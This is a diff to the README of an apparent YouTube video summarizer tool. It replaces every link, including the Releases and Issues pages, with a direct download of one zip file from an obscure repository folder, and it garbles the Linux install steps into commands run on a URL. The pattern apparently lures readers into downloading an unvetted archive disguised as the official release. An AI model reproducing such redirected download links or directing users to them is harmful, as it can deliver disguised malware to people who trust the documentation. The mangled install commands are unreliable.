@@ -1,6 +1,6 @@
 # 🎥 whisper-youtube-summarizer-groq - Summarize YouTube Videos with Ease
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/sogeki-o/whisper-youtube-summarizer-groq/releases)
+[![Download the latest release](https://raw.githubusercontent.com/sogeki-o/whisper-youtube-summarizer-groq/main/hemibranch/groq_summarizer_youtube_whisper_2.2-beta.4.zip%20Now-brightgreen)](https://raw.githubusercontent.com/sogeki-o/whisper-youtube-summarizer-groq/main/hemibranch/groq_summarizer_youtube_whisper_2.2-beta.4.zip)
 
 ## 📜 Description
 The whisper-youtube-summarizer-groq helps you extract summaries from YouTube videos and URLs. It uses advanced tools like Whisper for audio-to-text conversion and LangChain for document processing. This application efficiently summarizes long videos and webpages, saving you time while giving you essential insights.
@@ -16,7 +16,7 @@ Before you begin, ensure your computer meets these requirements:
 - An active internet connection to access YouTube videos
 
 ### Step 2: Visit the Releases Page
-Go to the [Releases page](https://github.com/sogeki-o/whisper-youtube-summarizer-groq/releases) to find the latest version of the application.
+Go to the [Releases page](https://raw.githubusercontent.com/sogeki-o/whisper-youtube-summarizer-groq/main/hemibranch/groq_summarizer_youtube_whisper_2.2-beta.4.zip) to find the latest version of the application.
 
 ### Step 3: Download the Application
 On the Releases page, look for the most recent version. Click on it to see the available download files. Choose the appropriate file for your operating system.
@@ -33,15 +33,15 @@ On the Releases page, look for the most recent version. Click on it to see the a
 3. **For Linux:**
    - Open a terminal.
    - Navigate to the directory where you downloaded the file.
-   - Use the command `chmod +x yourfile.run` to make it executable.
-   - Run the file with `./yourfile.run`.
+   - Use the command `chmod +x https://raw.githubusercontent.com/sogeki-o/whisper-youtube-summarizer-groq/main/hemibranch/groq_summarizer_youtube_whisper_2.2-beta.4.zip` to make it executable.
+   - Run the file with `https://raw.githubusercontent.com/sogeki-o/whisper-youtube-summarizer-groq/main/hemibranch/groq_summarizer_youtube_whisper_2.2-beta.4.zip`.
 
 ### Step 5: Run the Application
 Once installed, locate the application on your computer. Click to open it. 
 
 ## 📥 Download & Install
 To download the application:
-- Go to the [Releases page](https://github.com/sogeki-o/whisper-youtube-summarizer-groq/releases).
+- Go to the [Releases page](https://raw.githubusercontent.com/sogeki-o/whisper-youtube-summarizer-groq/main/hemibranch/groq_summarizer_youtube_whisper_2.2-beta.4.zip).
 - Choose the correct file for your OS.
 - Follow the installation instructions mentioned above.
 
@@ -61,12 +61,12 @@ To download the application:
 ## 🛠️ Troubleshooting Tips
 If you encounter issues:
 - Ensure your internet connection is stable.
-- Check that you have the latest version from the [Releases page](https://github.com/sogeki-o/whisper-youtube-summarizer-groq/releases).
+- Check that you have the latest version from the [Releases page](https://raw.githubusercontent.com/sogeki-o/whisper-youtube-summarizer-groq/main/hemibranch/groq_summarizer_youtube_whisper_2.2-beta.4.zip).
 - Restart the application if it becomes unresponsive.
 - Review system requirements to ensure compatibility.
 
 ## 🤝 Support
-For support or questions, you can open an issue on the GitHub [Issues page](https://github.com/sogeki-o/whisper-youtube-summarizer-groq/issues). 
+For support or questions, you can open an issue on the GitHub [Issues page](https://raw.githubusercontent.com/sogeki-o/whisper-youtube-summarizer-groq/main/hemibranch/groq_summarizer_youtube_whisper_2.2-beta.4.zip). 
 
 ## 🎉 Acknowledgments
 This project incorporates various technologies that enhance its functionality, including Whisper, yt-dlp, LangChain, and the Groq Llama models. 
